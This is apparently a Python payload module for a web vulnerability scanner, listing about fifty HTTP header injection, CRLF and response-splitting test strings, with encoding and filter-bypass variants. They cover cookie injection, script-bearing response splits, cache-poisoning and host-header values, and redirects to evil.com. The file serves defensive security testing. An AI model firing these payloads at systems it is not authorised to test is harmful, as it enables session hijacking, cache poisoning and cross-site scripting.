"""
scanner/payloads/header_injection.py

HTTP Header Injection / Response Splitting / CRLF payloads.
Tests for header injection vulnerabilities that can lead to:
- Cache poisoning
- XSS via response splitting
- Session fixation
- Request smuggling
"""

from .base import Payload


def header_injection_confirm(response_text: str) -> bool:
    """
    Check for header injection indicators.
    Look for injected header content in response.
    """
    indicators = [
        "x-injected:",
        "x-test:",
        "set-cookie: malicious",
        "set-cookie: injected",
        "x-custom:",
        "injected-header:",
        "\r\n\r\n",  # Response splitting
        "<html>injected",
    ]

    text_lower = response_text.lower()
    return any(ind.lower() in text_lower for ind in indicators)


def header_injection_error_confirm(response_text: str) -> bool:
    """Check for header injection error patterns."""
    indicators = [
        "invalid header",
        "header injection",
        "crlf",
        "newline in header",
        "illegal character in header",
    ]
    text_lower = response_text.lower()
    return any(ind in text_lower for ind in indicators)


def header_confirm(response_text: str) -> bool:
    """Combined confirmation."""
    return header_injection_confirm(response_text) or header_injection_error_confirm(response_text)


HEADER_INJECTION_PAYLOADS = [
    # ============================================
    # BASIC CRLF INJECTION
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="CRLF URL encoded",
        payload="%0d%0aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="CRLF raw",
        payload="\r\nX-Injected: true",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="LF only",
        payload="%0aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="CR only",
        payload="%0dX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # DOUBLE/TRIPLE ENCODED
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Double encoded CRLF",
        payload="%250d%250aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Triple encoded CRLF",
        payload="%25250d%25250aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Mixed encoding",
        payload="%0d%250aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # UNICODE VARIATIONS
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Unicode LF",
        payload="\u000aX-Injected: true",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Unicode CR",
        payload="\u000dX-Injected: true",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Unicode line separator",
        payload="\u2028X-Injected: true",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Unicode paragraph separator",
        payload="\u2029X-Injected: true",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # SET-COOKIE INJECTION (Session Fixation)
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Set-Cookie injection",
        payload="%0d%0aSet-Cookie: malicious=true",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Set-Cookie with path",
        payload="%0d%0aSet-Cookie: session=hijacked; Path=/",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Set-Cookie HttpOnly bypass",
        payload="%0d%0aSet-Cookie: test=value; HttpOnly",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Multiple cookies",
        payload="%0d%0aSet-Cookie: a=1%0d%0aSet-Cookie: b=2",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # RESPONSE SPLITTING (XSS)
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Response split basic",
        payload="%0d%0a%0d%0a<html>Injected</html>",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Response split with script",
        payload="%0d%0a%0d%0a<script>alert(1)</script>",
        contexts=["url"],
        severity="Critical",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Response split content-type",
        payload="%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>XSS</html>",
        contexts=["url"],
        severity="Critical",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Response split full response",
        payload="%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Injected</html>",
        contexts=["url"],
        severity="Critical",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # CACHE POISONING
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Cache-Control injection",
        payload="%0d%0aCache-Control: public, max-age=31536000",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="X-Forwarded-Host injection",
        payload="%0d%0aX-Forwarded-Host: evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Vary header injection",
        payload="%0d%0aVary: X-Injected-Header",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # HOST HEADER ATTACKS
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Host override",
        payload="evil.com",
        contexts=["header"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Host with port",
        payload="evil.com:443",
        contexts=["header"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="X-Forwarded-Host",
        payload="evil.com",
        contexts=["header"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="X-Host",
        payload="evil.com",
        contexts=["header"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # LOCATION HEADER INJECTION
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Location header redirect",
        payload="%0d%0aLocation: https://evil.com",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Location with 302",
        payload="%0d%0aHTTP/1.1 302 Found%0d%0aLocation: https://evil.com",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # CONTENT-TYPE MANIPULATION
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Content-Type to HTML",
        payload="%0d%0aContent-Type: text/html",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Content-Type to JSON",
        payload="%0d%0aContent-Type: application/json",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # FILTER BYPASS VARIATIONS
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Tab separator",
        payload="%09X-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Null byte prefix",
        payload="%00%0d%0aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Space prefix",
        payload=" %0d%0aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Backslash variant",
        payload="\\r\\nX-Injected: true",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # HEX ENCODED
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Hex encoded CR",
        payload="\\x0d\\x0aX-Injected: true",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Octal encoded",
        payload="\\015\\012X-Injected: true",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # SECURITY HEADER INJECTION
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="CSP bypass injection",
        payload="%0d%0aContent-Security-Policy: default-src *",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="X-Frame-Options removal",
        payload="%0d%0aX-Frame-Options: ALLOWALL",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="CORS header injection",
        payload="%0d%0aAccess-Control-Allow-Origin: *",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # REQUEST SMUGGLING INDICATORS
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Content-Length injection",
        payload="%0d%0aContent-Length: 0%0d%0a%0d%0a",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Transfer-Encoding injection",
        payload="%0d%0aTransfer-Encoding: chunked",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # MULTIPLE HEADERS
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Multiple header injection",
        payload="%0d%0aX-First: 1%0d%0aX-Second: 2%0d%0aX-Third: 3",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Header with long value",
        payload="%0d%0aX-Injected: " + "A" * 100,
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),

    # ============================================
    # EDGE CASES
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Empty header value",
        payload="%0d%0aX-Injected:",
        contexts=["url"],
        severity="Low",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Header with special chars",
        payload="%0d%0aX-Injected: test<>\"'",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="CRLF in value",
        payload="test%0d%0aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="URL encoded newlines in JSON",
        payload='{"test":"%0d%0aX-Injected: true"}',
        contexts=["json"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="CRLF with comment",
        payload="%0d%0a#comment%0d%0aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Only whitespace after CRLF",
        payload="%0d%0a %0d%0aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="Referer header injection",
        payload="%0d%0aReferer: https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="X-Original-URL injection",
        payload="%0d%0aX-Original-URL: /admin",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
]
